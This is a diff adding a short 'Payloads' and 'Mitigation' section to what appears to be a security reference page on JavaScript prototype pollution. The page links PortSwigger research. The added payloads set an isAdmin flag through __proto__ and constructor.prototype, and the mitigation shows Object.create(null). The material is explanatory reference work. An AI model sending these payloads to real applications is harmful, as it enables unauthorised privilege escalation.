@@ -13,6 +13,26 @@ weight: 620
 toc: true
 ---
 
+## Payloads
+
+```js
+obj.__proto__.isAdmin = true;
+obj["__proto__"]["isAdmin"] = true;
+
+obj.constructor.prototype.isAdmin = true;
+obj["constructor"]["prototype"]["isAdmin"] = true;
+```
+
+## Mitigation
+
+```js
+({}).isAdmin
+=> true
+
+Object.create(null).isAdmin
+=> undefined
+```
+
 ## Resources
 
 - [Server-side prototype pollution: Black-box detection without the DoS](https://portswigger.net/research/server-side-prototype-pollution)
